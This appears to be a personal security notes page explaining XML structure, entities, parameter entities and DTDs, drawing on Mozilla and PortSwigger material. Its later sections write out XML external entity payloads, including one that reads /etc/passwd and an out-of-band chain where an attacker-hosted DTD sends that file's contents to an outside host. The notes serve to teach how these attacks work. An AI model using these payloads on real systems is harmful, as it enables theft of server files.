# Extensible Markup Language (XML)

> XML (Extensible Markup Language) is a markup language similar to HTML, but without predefined tags to use. Instead, you define your own tags designed specifically for your needs. This is a powerful way to store data in a format that can be stored, searched, and shared. *- [Mozilla](https://developer.mozilla.org/en-US/docs/Web/XML/XML_introduction)*

---

## Basic Structure

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!-- Comment Format -->
<message>
	<banner>Hello World!</banner>
</message>
```

---

## XML Entities

XML entities are variables in an XML document. When an XML document contains an entity, it will be replaced by its value when the document is processed.

There are several constant entities whose values don't change. You can also define your own entities.

### Constant Entities

| Entity | Value |
| --- | --- |
| `&lt;` | < |
| `&gt;` | > |
| `&amp;` | & |
| `&apos;` | ' |
| `&quot;` | " |

### General Entities

General entities are specified in the XML document's [[xml#Document Type Definition DTD|DTD]]. There are two types: regular or internal entities and external entities.

#### Regular/Internal Entities

Regular/internal entities' values are defined within the XML document's [[xml#Document Type Definition DTD|DTD]]. For example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY hello_world_string "Hello World!"> ]>
<message>
	<banner>
		&hello_world_string; <!-- Will be replaced with "Hello World!" when the document is processed -->
	</banner>
</message>
```

#### External Entities

External entities' values are defined by reading in the content of a resource at a **URL**. They are designated with the `SYSTEM` keyword.

For example, to set the value of the `contents` entity to the value of the server-local file `/etc/passwd`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY contents SYSTEM "file:///etc/passwd"> ]>
<message>
	<banner>&contents;</banner>
</message>
```

To set the value of the `contents` entity to the value of the data at `http://tgihf.click/blah`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY contents SYSTEM "http://tgihf.click/blah"> ]>
<message>
	<banner>&contents;</banner>
</message>
```

### Parameter Entities

Parameter entities are XML entities who can **only be used in a [[xml#Document Type Definition DTD|DTD]] (internal or external)**. Parameter entities are specified with the `%` character.

#### Parameter Entities & Internal DTDs

One of the most significant features of parameter entities is that they can be assigned the value of another entity.

Consider the following XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
	<!ENTITY % parameter_entity_name "<!ENTITY general_entity 'blah'>">
	%parameter_entity;
]>
<data>&general_entity;</data>
```

The parser assigns the string `<!ENTITY general_entity 'blah'>` to the parameter entity `%parameter_entity;`, effectively resulting in the following XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
	<!ENTITY % parameter_entity_name "<!ENTITY general_entity 'blah'>">
	<!ENTITY general_entity 'blah'>
]>
<data>&general_entity;</data>
```

Thus, when the document is fully parsed, `&general_entity;` will be replaced with the string `blah`, like so:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
	<!ENTITY % parameter_entity_name "<!ENTITY general_entity 'blah'>">
	<!ENTITY general_entity 'blah'>
]>
<data>blah</data>
```

#### Parameter Entities & External DTDs

The significant drawback of using parameter entities within a document's internal [[xml#Document Type Definition DTD|DTD]] is that according to the XML specification, it is illegal to reference a parameter entity within a markup declaration in an internal [[xml#Document Type Definition DTD|DTD]].

For example, consider the following XML document:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
	<!ENTITY % passwd SYSTEM "file:///etc/passwd">
	<!ENTITY % wrapper "<!ENTITY send SYSTEM 'http://tgihf.click?f=%passwd;'>">
	%wrapper;
]>
<data>&send;</data>
```

The parser *seems* like it would do the following:

1. Assign the contents of `/etc/passwd` to the parameter entity `passwd`
2. Assign the string `<!ENTITY send SYSTEM 'http://tgihf.click?f=&passwd;'` to the parameter entity `wrapper`. The value of the `passwd` parameter entity would be the contents of `/etc/passwd`, resulting in the `wrapper` parameter entity value of `<!ENTITY send SYSTEM 'http://tgihf.click?f=$CONTENTS_OF_ETC_PASSWD'`
3. Expand the `wrapper` parameter entity, creating the general entity `send` whose value is the result of making the HTTP request to `http://tgihf.click?f=$CONTENTS_OF_ETC_PASSWD`
4. Expand the `send` general entity within the body of the document

However, the parser would fail at step 2 because **within an internal [[xml#Document Type Definition DTD|DTD]], it is illegal to reference a parameter entity within a markup declaration.**

This is, however, completely legal **within an external [[xml#Document Type Definition DTD|DTD]]**.

Consider the attacker is hosting the following [[xml#Document Type Definition DTD|DTD]] at `http://tgihf.click/tgihf.dtd`:

```xml
<!ENTITY % passwd SYSTEM "file:///etc/passwd">
<!ENTITY % wrapper "<!ENTITY send SYSTEM 'http://tgihf.click/?f=%passwd;'>">
%wrapper;
```

The attacker then inputs the following XML document, which the target web application parses:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE send SYSTEM "http://tgihf.click/blah.dtd">
<!-- You could use the below external parameter entity as an alternate to the above external general entity -->
<!-- <!DOCTYPE foo [
	<!ENTITY % send SYSTEM "http://tgihf.click/blah.dtd"> 
	%send;
]>
-->
<data>blah</data>
```

The parser will:

1. Evaluate the internal [[xml#Document Type Definition DTD|DTD]], which contains the general external entity `send` whose value is the contents of the external [[xml#Document Type Definition DTD|DTD]] that the attacker is hosting at `http://tgihf.click/blah.dtd`
2. Evaluate the fetched external [[xml#Document Type Definition DTD|DTD]]:
3. Assign the contents of the server-local file `/etc/passwd` to the `passwd` parameter entity
4. Insert those contents into the string `<!ENTITY send SYSTEM 'http://tgihf.click/?f=$CONTENTS'` and assign that string to the parameter entity `wrapper`
5. Evaluate the entity `wrapper`, which makes an HTTP `GET` request to `http://tgihf.click/?f=$CONTENTS`

---

## Document Type Definition (DTD)

The XML document type definition (DTD) contains declarations that define the structure of an XML document, the types of data values it can contain, and other items. The DTD is declared within the optional `DOCTYPE` element at the beginning of the XML document, like so:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE $STUFF >
```

A DTD can refer only to the current XML document (known as an "internal DTD") or it can be loaded from elsewhere (known as an "external DTD") or can be a hybrid of the two.

---

## References

[Mozilla - XML](https://developer.mozilla.org/en-US/docs/Web/XML/XML_introduction)

[PortSwigger Web Security Academy - XML entities](https://portswigger.net/web-security/xxe/xml-entities#:~:text=What%20are%20XML%20entities%3F,represent%20the%20characters%20.)
